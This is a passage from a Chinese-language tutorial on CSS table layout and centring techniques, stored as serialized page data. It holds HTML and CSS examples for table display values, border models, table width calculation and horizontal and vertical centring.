position: absolute;\n            width: 310px;\n            /*从左往右偏移父元素宽度的50%*/\n            left: 50%;\n            /*左移调整，数值是自身宽度的50%*/\n            transform: translateX(-50%);\n        }\n        /*其他内容只能写到parent内部了*/\n        .col1, .col2, .col3 { display: inline-block; width: 100px; height: 100px; }\n        .col1 {  background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col1"></div>\n            <div class="col2"></div>\n            <div class="col3"></div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# 2.2 垂直居中\n\n垂直居中意思是让子元素在父容器内部垂直方向上是居中显示的。\n\n# 2.2.1 使用vertical-align\n\n使用vertical-align需要回顾一下vertical-align和文字垂直对齐。\n\nvertical-align是直接设置在内联元素或者单元格上的，并且这两种情况还有区别。设置在内联元素上，是让内联元素本身相对于line box进行垂直对齐的。而设置在单元格上，是让单元格内部内容相对于单元格这个容器进行垂直对齐的。\n\n这里我们使用“设置在单元格上”这个方式。优点就是能对多个子元素在一列上进行垂直居中布局的。缺点的话其实还好，子元素同级要使用文本时也是居中的，其实文本直接用div包裹起来就行了，不算是什么问题吧。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            display: table-cell;\n            vertical-align: middle;\n            width: 100px;\n            height: 500px;\n            border: 1px solid red;\n        }\n        .col1, .col2, .col3 { width: 100px; height: 100px; }\n        .col1 {  background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 2.2.2 绝对定位+位移变换\n\n跟水平居中的第三种方案一样，使用绝对定位将子元素的位置居中，再使用transform: translateY(-50%);进行调整\n\n该方法优点是，还算比较简单，子元素同级的文本不受到影响。缺点就是开启了相对定位以及绝对定位，绝对定位脱离了文档流，也只能对一个元素进行水平居中布局。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix {\n            position: relative;\n            width: 100px;\n            height: 500px;\n            border: 1px solid red;\n        }\n        .parent {\n            position: absolute;\n            width: 100px;\n            /*从左往右偏移父元素宽度的50%*/\n            top: 50%;\n            /*左移调整，数值是自身宽度的50%*/\n            transform: translateY(-50%);\n        }\n        /*其他内容只能写到parent内部了*/\n        .col1, .col2, .col3 { width: 100px; height: 100px; }\n        .col1 {  background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col1"></div>\n            <div class="col2"></div>\n            <div class="col3"></div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n# 2.2.3 绝对定位+auto外边距\n\n其实这各方案也能在水平居中里使用的，核心就是利用定位元素的隐藏等式来让元素进行居中的，当然你还得熟悉auto。\n\n具体等式是这样的：\ntop + margin-top + border-top-height + padding-top + height + padding-bottom + border-bottom-height + margin-bottom + bottom = the height of the containing block\n\n因为包含块的高度就是父级元素的高度，让子元素高度显示设置，然后让top和bottom都设置为0，内边距和边框可以不同设置，最后让上下外边距为auto。css就会按照上面的的等式以及刚刚设置的其他值，为外边距自动分配数值，这样就达到了一个垂直居中的效果。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix {\n            position: relative;\n            width: 100px;\n            height: 500px;\n            border: 1px solid red;\n        }\n        .parent {\n            position: absolute;\n            width: 100px;\n            height: 300px;\n            top: 0;\n            bottom: 0;\n            margin: auto 0;\n        }\n        /*其他内容只能写到parent内部了*/\n        .col1, .col2, .col3 { width: 100px; height: 100px; }\n        .col1 {  background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col1"></div>\n            <div class="col2"></div>\n            <div class="col3"></div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# 2.3 水平+垂直居中\n\n# 2.3.1 使用单元格\n\n其实就是单元格内的对齐，也就是使用text-align加上vertical-align，可以同时设置在单元格上，因为单元格可以视为块级元素，所以可以使用text-align，而vertical-align本来就有一个特殊场景使用在单元格上。当然子元素得是inline-block，不然满足不了两者。\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            display: table-cell;\n            width: 400px;\n            height: 400px;\n            text-align: center;\n            vertical-align: middle;\n            border: 1px solid red;\n        }\n        .inner {\n            display: inline-block;\n            width: 200px;\n            height: 200px;\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner">\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# 2.3.2 vertical-align+auto外边距\n\n这个方法其实就是对上一种方案的改进，不使用inline-block，直接让块级元素的外边距为auto。\n\n<html>\n<head>\n    <style type="text/css">\n        .outer {\n            display: table-cell;\n            width: 400px;\n            height: 400px;\n            text-align: center;\n            vertical-align: middle;\n            border: 1px solid red;\n        }\n        .inner {\n            width: 200px;\n            height: 200px;\n            margin: 0 auto;\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner">\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n以上两种方法都使用了单元格，如果.outer的width设置为100%，水平居中就失效了。原因就是表宽计算问题，此时表就一个单元格，内容大概是200px，并且还设置单元格width: 100%。css就会认为你这一列的列宽是200 / 100% = 200px，只有一列那么总列宽就是200px，又因为表没有显式设置宽度，那么总列宽会作为最终的表宽也就是200px，这样就导致水平居中失效了。\n\n解决办法是，在单元格外加一个div并设置display: table; width: 100%;，代码如下\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            display: table;\n            width: 100%;\n        }\n        .outer {\n            display: table-cell;\n            width: 100%;\n            height: 400px;\n            text-align: center;\n            vertical-align: middle;\n            border: 1px solid red;\n        }\n        .inner {\n            display: inline-block;\n            width: 200px;\n            height: 200px;\n            background-color: blue;\n        }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="outer">\n            <div class="inner">\n            </div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# 2.3.3 绝对定位+位移变换\n\n利用绝对定位和top、left进行偏移，然后使用transform进行调整。\n\n<html>\n<head>\n    <style type="text/css">\n    .outer {\n        position: relative;\n        width: 400px;\n        height: 400px;\n        border: 1px solid red;\n    }\n    .inner {\n        position: absolute;\n        width: 200px;\n        height: 200px;\n        top: 50%;\n        left: 50%;\n        transform: translate(-50%, -50%);\n        background-color: blue;\n    }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n# 2.3.4 绝对定位+auto外边距\n\n该方案核心就是利用定位元素的隐藏等式来让元素进行居中的，当然你还得熟悉auto。\n\n定位元素的水平方向： left + margin-left + border-left-width + padding-left + width + padding-right + border-right-width + margin-right + right = the width of the containing block\n\n定位元素的垂直方向： top + margin-top + border-top-height + padding-top + height + padding-bottom + border-bottom-height + margin-bottom + bottom = the height of the containing block\n\n<html>\n<head>\n    <style type="text/css">\n    .outer {\n        position: relative;\n        width: 400px;\n        height: 400px;\n        border: 1px solid red;\n    }\n    .inner {\n        position: absolute;\n        width: 200px;\n        height: 200px;\n        top: 0;\n        left: 0;\n        bottom: 0;\n        right: 0;\n        margin: auto;\n        background-color: blue;\n    }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <div class="inner"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n',normalizedContent:'# 表格布局与居中布局\n\n\n# 一、表格布局\n\n很久以前是使用html<table>标签给页面元素进行布局的，但由于不灵活、难以调试等缺点被其他布局方案所取代了。现在基本很少会用到表格布局，也只是用于兼容一些不支持flexbox和grid的浏览器，或者在一些小模块里使用它。\n\n一个<table>标签之所以能够像表格那样展示，是由于css默认给<table>标签设置了一组table布局属性。当这些属性被应用于排列非<table>元素时，这种用法被称为“使用css表格”。\n\n\n# 1.1 与表相关的display值\n\n值                    意义\ntable                指定元素为块级表\ninline-table         指定元素为内联表\ntable-row            指定元素为表的某行\ntable-row-group      指定元素对一行或多行为表的行分组\ntable-header-group   指定元素为标题行（表头），位于所有行和行分组之前\ntable-footer-group   指定元素为页脚行，位于所有行和行分组之后\ntable-column         指定元素为表的某列，但不会被可视化呈现\ntable-column-group   指定元素对一列或多列为表的列分组，但不会被可视化呈现\ntable-cell           指定元素为表的单元格\ntable-caption        指定元素为表的标题，只有一个\n\n给下面加上css的表相关的display值\n\n<scores>\n  <headers>\n    <label>team</label>\n    <label>score</label>\n  </headers>\n  <game sport="mlb" league="nl">\n    <team>\n      <name>reds</name>\n      <score>8</score>\n    </team>\n    <team>\n      <name>cubs</name>\n      <score>5</score>\n    </team>\n  </game>\n</scores>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nscores { display: table; }\nheaders { display: table-header-group; }\ngame { display: table-row-group; }\nteam { display: table-row; }\nlabel,\nname,\nscore { display: table-cell; }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 1.2 匿名补全表格\n\n在使用表布局时，元素的结构可能不是完整的表形式的，那么css会为表插入缺少的部件（匿名对象的方式）。\n\n 1. 如果table-cell元素的父元素不是table-row元素，则在table-cell元素与其父元素之间插入一个匿名table-row对象。插入的对象将包括table-cell元素的所有连续兄弟元素。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        system { display: table; }\n        name,\n        moons { display: table-cell; }\n        </style>\n    </head>\n    <body>\n        <system>\x3c!--会在system内匿名插入一个table-row，新行会包含name和moons--\x3e\n            <name>mercury</name>\n            <moons>0</moons>\n        </system>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 2. 如果table-row元素的父元素不是table、inline-table或table-row-group元素，则在table-row元素与其父元素之间插入一个匿名table元素。插入的对象将包括table-row元素的所有连续兄弟元素。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        docbody { display: block; }\n        planet { display: table-row; }\n        </style>\n    </head>\n    <body>\n        <docbody>\x3c!--docbody和planet之间匿名插入一个table--\x3e\n            <planet>\n                <name>mercury</name>\n                <moons>0</moons>\n            </planet>\n            <planet>\n                <name>venus</name>\n                <moons>0</moons>\n            </planet>\n        </docbody>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    \n\n 3. 如果table-column元素的父元素不是table、inline-table或table-column-group元素，则在table-column元素与其父元素之间插入一个匿名table元素。例子与上面类似。\n\n 4. 如果table-row-group、table-header-group、table-footer-group、table-column-group或table-caption元素的父元素不是table元素，则在元素与其父元素之间插入一个匿名table对象。例子与上面类似。\n\n 5. 如果table或inline-table元素的子元素不是table-row-group、table-header-group、table-footer-group、table-row或table-caption元素，则在table元素及其子元素之间插入一个匿名table-row对象。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        system { display: table; }\n        planet { display: table-row; }\n        name,\n        moons { display: table-cell; }\n        </style>\n    </head>\n    <body>\n        <system>\n            <planet>\n                <name>mercury</name>\n                <moons>0</moons>\n            </planet>\n            <name>venus</name>\x3c!--name和moons外面匿名插入一个table-row--\x3e\n            <moons>0</moons>\n        </system>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    \n\n 6. 如果table-row-group、table-header-group或table-footer-group元素的子元素不是table-row元素，则在元素及其子元素之间插入一个匿名table-row对象。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        system { display: table; }\n        planet { display: table-row-group; }\n        name,\n        moons { display: table-cell; }\n        </style>\n    </head>\n    <body>\n        <system>\n            <planet>\n                <name>mercury</name>\x3c!--name和moons外面匿名插入一个table-row--\x3e\n                <moons>0</moons>\n            </planet>\n            <name>venus</name>\x3c!--name和moons外面匿名插入一个table-row--\x3e\n            <moons>0</moons>\n        </system>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    \n\n 7. 如果table-row元素的子元素不是table-cell元素，则在元素及其子元素之间插入一个匿名table-cell对象。这个匿名对象包含了所有非table-cell元素的子元素的连续兄弟元素。\n    \n    <html>\n    <head>\n        <style type="text/css">\n        system { display: table; }\n        planet { display: table-row; }\n        name,\n        moons { display: table-cell; }\n        </style>\n    </head>\n    <body>\n        <system>\n            <planet>\n                <name>mercury</name>\n                <num>0</num>\x3c!--num没有display值，外面匿名插入一个table-cell--\x3e\n            </planet>\n        </system>\n    </body>\n    <html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    \n\n\n# 1.3 了解表分层\n\ncss给表定义了六个单独的“层”：表——列组——列——行组——行——单元格\n\n\n要了解这个分层，上一层的样式会覆盖下一层的样式，这在对表进行样式书写时很重要。\n\n\n# 1.4 边界模型\n\n边界模型主要是用于描述单元格的边界border，有两种：分离边界模型和折叠边界模型。可以使用border-collapse属性来选择表的边界模型，其值一般是collapse或separate。\n\n# 1.4.1 分离边界模型\n\n分离边界模型：表本身以及表的单元格都有各自的边界border，表与单元格之间还有内边距，并且单元格与单元格之间也有间距。\n\n\n\n单元格与单元格之间的间距是由border-spacing控制的，要注意的一点是，表内边距与这个间距是相加的（并不是折叠）。如果单元格内容为空，默认也会为它绘制border的（默认是empty-cells:show），如果设置empty-cells:hide那将不会为空的单元格绘制border。\n\n<html>\n<head>\n    <style type="text/css">\n    table {\n        border-collapse: separate;  /*分离边界模型*/\n        border: 1px solid black;\n        padding: 5px;              /*表与单元格之间的间距，其实就是表的内边距*/\n        border-spacing: 5px 8px;    /*单元格与单元格之间，水平间距5px，垂直间距8px*/\n    }\n    td {\n        border: 3px double black;   /*单元格里有各自的border，这里都是双实线*/\n        padding: 3px;\n        empty-cells: hide;          /*单元格为空，此时根据empty-cells的值，不会为空单元格绘制border*/\n    }\n    </style>\n</head>\n<body>\n    <table cellspacing="0">\n        <tr>\n            <td>cell one</td>\n            <td>cell two</td>\n        </tr>\n        <tr>\n            <td>cell three</td>\n            <td></td>\n        </tr>\n    </table>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n# 1.4.2 折叠边界模型\n\n折叠边界模型：表本身以及表的单元格，它们的边界都是折叠在一起的，表与单元格之间没有内边距（因为表与单元格边界折叠了），并且单元格与单元格之间也没有间距（因为单元格与单元格边界也折叠了）。\n\n\n\n它们所有的边界都已经折叠在一起了，所以border-spacing的设置会被忽略，表的内边距也被忽略掉。empty-cells:hide其实也会被忽略，会强制给空单元格绘制border。将上面例子里的border-collapse: separate改为border-collapse: collapse就可以查看折叠边界模型的效果。\n\n<html>\n<head>\n    <style type="text/css">\n    table {\n        border-collapse: collapse;  /*折叠边界模型*/\n        border: 1px solid black;\n        padding: 5px;              /*表内边距失效*/\n        border-spacing: 5px 8px;    /*单元格之间的间距失效*/\n    }\n    td {\n        border: 3px double black;   /*单元格共享border，这里都是双实线*/\n        padding: 3px;               /*内容与单元格之间的内边距还是有效的*/\n        empty-cells: hide;          /*失效*/\n    }\n    </style>\n</head>\n<body>\n    <table cellspacing="0">\n        <tr>\n            <td>cell one</td>\n            <td>cell two</td>\n        </tr>\n        <tr>\n            <td>cell three</td>\n            <td>cell four</td>\n        </tr>\n    </table>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n比较有趣的一点就是边界折叠后，表分层对边界没有太大的影响，它有自己的一套优先级顺序来决定边界的样式：\n\n * border-style为hidden的边界会优先于其他规则；\n * 宽的边界优先于窄的边界，也就是width值大的优先；\n * 边界线条类型按照这个顺序优先：double、solid、dashed、dotted、ridge、outset、groove、inset、none；\n * 如果线条类型和width都相同，但颜色不同，那颜色就由表分层的顺序来决定了。\n\n\n# 1.5 表大小\n\n# 1.5.1 基本计算\n\n上一节的两种边界模式会导致表的宽高计算不一样。\n\n\n\n分离边界模型的宽：\n\n * 假设表边界是4px，表内边距是3px，水平间距是6px，单元格边界是2px，单元格内容加上内边距是20px；\n * 那么表总宽就是tbody的宽加上表左右边界再加上表左右内边距，即table = 4px + 3px + tbody + 3px + 4px；\n * 而tbody的宽是所有列加上所有水平间距，默认所有单元格相同，即tbody = 6px * 3 + col * 2；\n * col的宽是内容加上内边距再加上单元格左右边界，即col = 2px + 20px + 2px；\n * 最后表总宽为table = 4px + 3px + (6px * 3 + (2px + 20px + 2px) * 2) + 3px + 4px，总共80px。\n\n\n\n折叠边界模型的宽：\n\n * 没有表内边距，也没有水平垂直间距；假设表边界和单元格边界都是1px，单元格内容加上内边距是20px；\n * 那么表总宽就是tbody的宽加上表左右边界的一半，即table = 0.5px + tbody + 0.5px；\n * 而tbody的宽是所有列的宽之和，默认所有单元格相同，即tbody = col * 3；\n * col的宽是内容加上内边距再加上单元格左右边界的一半，即col = 0.5px + 20px + 0.5px；\n * 最后表总宽为table = 0.5px + (0.5px + 20px + 0.5px) * 3 + 0.5px，总共64px。\n\n# 1.5.2 固定和自动\n\n以上是最基础的宽度高度计算，但是表宽高在具体计算时有不同的表现，其中表宽有固定宽度布局和自动宽度布局两种表现方式，而表高就只有自动高度布局。可以使用table-layout属性来为表选择布局模式，其值为auto | fixed。\n\n两种表现方式的区别：固定宽度布局主要是以第一行为基准，而自动宽度布局要“征询”所有行的“意见”。\n\n固定宽度布局：\n\n * 如果列设置了width值，那么这一列的宽度就是该width值。\n * 如果列设置了auto值，但是该列第一行单元格设置了width值，那么这一列的宽度就是第一行单元格的width值。\n * 如果列设置了auto值，但是该列第一行单元格设置了width值，并且这个单元格跨列了，那么会被划分到各自的列里。\n * 算出了总列宽，但是表也单独设置了宽度并且还比总列宽的值大，多出部分会分配给列（也是第一行为基准）。如果有几列没有设置width值，多出部分会平分给这几列；如果所有列都有固定的width值，那就将多出的部分平分给所有列。\n * 如果表设置的宽度小于算出的总列宽，那会忽略设置的表宽，而总列宽会作为最终的表宽。\n\n<html>\n<head>\n    <style>\n    table {\n        table-layout: fixed;                /*固定宽度布局*/\n        width: 400px;                       /*表总宽*/\n        border-collapse: collapse;          /*表是折叠边界模型*/\n    }\n    td { padding: 0; border: 1px solid; }   /*单元格内边距为0，边界为1包括表边界*/\n    col#c1 { width: 200px; }                /*第一列的宽为200px*/\n    #r1c2 { width: 76px; }                  /*第二列第一行的单元格内容宽为76px*/\n    #r2c3 { width: 500px; }                 /*不在第一行会被忽略*/\n    </style>\n</head>\n<body>\n    <table>\n        <colgroup>\n            <col id="c1" /><col id="c2" /><col id="c3" /><col id="c4" />\n        </colgroup>\n        \x3c!-- 最后两列没有width，那就会被分配，(400 - 0.5 * 2 - 200 - 0.5 * 2 - 76) / 2 = 61px --\x3e\n        \x3c!-- 在浏览器调试代码时，将鼠标悬浮至最后两列显示宽度就是61px，内容自然是61 - 0.5 * 2 = 60px --\x3e\n        <tr>\n            <td id="r1c1">1-1</td><td id="r1c2">1-2</td><td id="r1c3">1-3</td><td id="r1c4">1-4</td>\n        </tr>\n        <tr>\n            <td id="r2c1">2-1</td><td id="r2c2">2-2</td><td id="r2c3">2-3</td><td id="r2c4">2-4</td>\n        </tr>\n        <tr>\n            <td id="r3c1">3-1</td><td id="r3c2">3-2</td><td id="r3c3">3-3</td><td id="r3c4">3-4</td>\n        </tr>\n        <tr>\n            <td id="r4c1">4-1</td><td id="r4c2">4-2</td><td id="r4c3">4-3</td><td id="r4c4">4-4</td>\n        </tr>\n    </table>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n自动宽度布局：\n\n * 对于列中的每个单元格，计算最小单元格宽度。\n   * 确定显示内容所需的最小宽度（内容可在单元格内换行显示）；\n   * 如果单元格设置了width值，并且大于内容所需的最小宽度，那么最小单元格宽度就是这个width值；\n   * 如果单元格设置的width值为auto，那么最小单元格宽度就是内容所需的最小宽度。\n * 对于列中的每个单元格，计算最大单元格宽度。\n   * 确定显示内容所需的最大宽度，除了强制换行（<br>）以外，不会自动进行换行，此时内容最大宽度就是最大单元格宽度。\n * 对于每个列，计算最小列宽。\n   * 如果列设置了width值，并且大于列中所有最小单元格宽度，那么最小列宽就是这个width值。\n   * 如果列没有设置width值，最小列宽就是列中所有最小单元格宽度里最大的那一个。\n * 对于每个列，计算最大列宽。\n   * 如果列设置了width值，并且大于列中所有最大单元格宽度，那么最大列宽就是这个width值。\n   * 如果列没有设置width值，最大列宽就是列中所有最大单元格宽度里最大的那一个。\n * 对于跨多个列的单元格\n   * 最小列宽的和必须等于该单元格的最小单元格宽度；\n   * 最大列宽的和必须等于该单元格的最大单元格宽度。\n * 算出了总列宽（使用最大列宽来展示），但是表也单独设置了宽度并且还比总列宽的值大，多出部分会分配给列（也是第一行为基准）。如果有几列没有设置width值，多出部分会平分给这几列；如果所有列都有固定的width值，那就将多出的部分平分给所有列。\n * 如果表设置的宽度小于算出的总列宽，那会忽略设置的表宽，而总列宽会作为最终的表宽。\n\n<html>\n<head>\n    <style>\n    table {\n        table-layout: auto;\n        width: auto;\n        border-collapse: collapse;\n    }\n    td { border: 1px solid; padding: 0; }\n    col#c3 { width: 25%; }\n    #r1c2 { width: 40%; }\n    #r2c2 { width: 50px; }\n    #r2c3 { width: 35px; }\n    #r4c1 { width: 100px; }\n    #r4c4 { width: 1px; }\n    </style>\n</head>\n<body>\n    <table>\n        <colgroup>\n            <col id="c1" /><col id="c2" /><col id="c3" /><col id="c4" />\n        </colgroup>\n        <tr>\n            <td id="r1c1">1-1</td><td id="r1c2">1-2</td><td id="r1c3">1-3</td><td id="r1c4">1-4</td>\n        </tr>\n        <tr>\n            <td id="r2c1">2-1</td><td id="r2c2">2-2</td><td id="r2c3">2-3</td><td id="r2c4">2-4</td>\n        </tr>\n        <tr>\n            <td id="r3c1">3-1</td><td id="r3c2">3-2</td><td id="r3c3">3-3</td><td id="r3c4">3-4</td>\n        </tr>\n        <tr>\n            <td id="r4c1">4-1</td><td id="r4c2">4-2</td><td id="r4c3">4-3</td><td id="r4c4">4-4</td>\n        </tr>\n    </table>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n上面这个例子，第一列的最小和最大列宽都为100px，第二列的最小列宽是50px而最大列宽是40%，第三列的最小列宽是35px而最大列宽是25%，第四列的最小和最大列宽都是单元格最小内容宽度。根据第二、三列反推出的表宽大概在一百多，而根据第一、四列反推出的表宽要更大，那就是第一、四列反推是正确的思路。(100+24+4)/(1-25%-40%)=366px，其中24是估算的第四列内容宽度，4是剩余border总和。注意：因为百分比还有表格宽度展示使用整数等原因，计算出的总宽度还有列宽度会有误差。\n\n可能觉得自动宽度布局很复杂，那自动高度布局也会很复杂，其实高度取决于内容换行。如果表设置了高的值，它更像是min-height，也就说实际表高度可能比设置的高度要大。如果实际高度小于设置高度，那可能会扩展出新行也可能会留出空白。建议尽可能避免设置表高度。\n\n\n# 1.6 单元格内的对齐\n\n水平对齐方式：因为单元格被视为块级别的框（单独拿一个来看），那么使用text-align就可以完成单元格里内联内容的水平对齐了。text-align属性，其值left | right | center | justify，这个justify稍微注意一下是两端对齐，会调整单词和字母间的间隔，使各行的长度恰好相等。\n\n垂直对齐方式：直接使用vertical-align属性，经常使用的值top | bottom | middle | baseline，而sub | super | text-top | text-bottom这几个被应用在单元格时会被忽略（内部内联元素使用vertical-align时，还是所有值都有效）。还有这个baseline复杂一些，它是基线对齐，会让一行里的所有单元格内容按照初始单元格基线对齐，初始单元格基线一般是内容第一行的文本底线。\n\n参考：text-align水平对齐和vertical-align垂直对齐\n\n\n# 二、居中布局\n\n\n# 2.1 水平居中\n\n水平居中意思是让子元素在父容器内部水平方向上是居中显示的。\n\n# 2.1.1 使用text-align\n\n使用text-align: center是最简单的一种水平对齐方式，不过text-align属性是设置在具有块级特性的元素上的，然后对元素内部的内联内容进行水平居中对齐。可以回顾一下之前的文字水平对齐。那么子元素得是内联元素（文本也行）或者display: inline-block内联块级元素也可以。\n\n该方法的优点是，text-align的兼容性很好，如果搭配display: inline-block还能对多个子元素在一排上进行水平居中布局的。有个小缺点就是，text-align会影响到子元素文本内容对齐方式，需要在子元素上额外设置自己的text-align来屏蔽父容器的text-align。\n\n\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            width: 600px;\n            border: 1px solid red;\n            /*让元素内部的并具有内联性质的子元素进行水平居中对齐*/\n            text-align: center;\n        }\n        .col1, .col2, .col3 {\n            /*内联块级元素*/\n            display: inline-block;\n            width: 100px;\n            height: 100px;\n            text-align: left;\n        }\n        .col1 { background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n如果熟悉浏览器兼容，text-align: -moz-center和text-align: -webkit-center是能对元素内部具有块性质的子元素进行水平居中对齐的。效果跟上面不一样，因为是块级元素，所以内容都单独占据一行，那么效果就是在一列上的元素都是水平居中对齐的。\n\n\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            width: 600px;\n            border: 1px solid red;\n            text-align: center;\n            /* 让元素内部的并具有块性质的子元素进行水平居中对齐 */\n            text-align: -webkit-center;\n        }\n        .col1, .col2, .col3 {\n            width: 100px;\n            height: 100px;\n            text-align: left;\n        }\n        .col1 { background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n# 2.1.2 使用auto外边距\n\n如果一个块级元素显式设置了宽度，它的外边距设置为auto时，那么这个块级元素会水平居中（原因是块级元素的隐藏等式）。其实这种方法跟上面的text-align: -moz-center和text-align: -webkit-center的效果是类似的，只是我们这种方法没有兼容性问题。\n\n这种方法优点是，比较简单常用，缺点就是只能对一个元素进行水平居中布局，其他内容只能写到子元素内部了。相比于text-align: center+display: inline-block这种方法，会多套一层元素。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix {\n            width: 600px;\n            border: 1px solid red;\n        }\n        .parent {\n            width: 310px;\n            /* 让parent居中 */\n            margin: 0 auto;\n        }\n        /* 其他内容只能写到parent内部了 */\n        .col1, .col2, .col3 { display: inline-block; width: 100px; height: 100px; }\n        .col1 {  background-color: red; }\n        .col2 { background-color: yellow; }\n        .col3 { background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col1"></div>\n            <div class="col2"></div>\n            <div class="col3"></div>\n        </div>\n    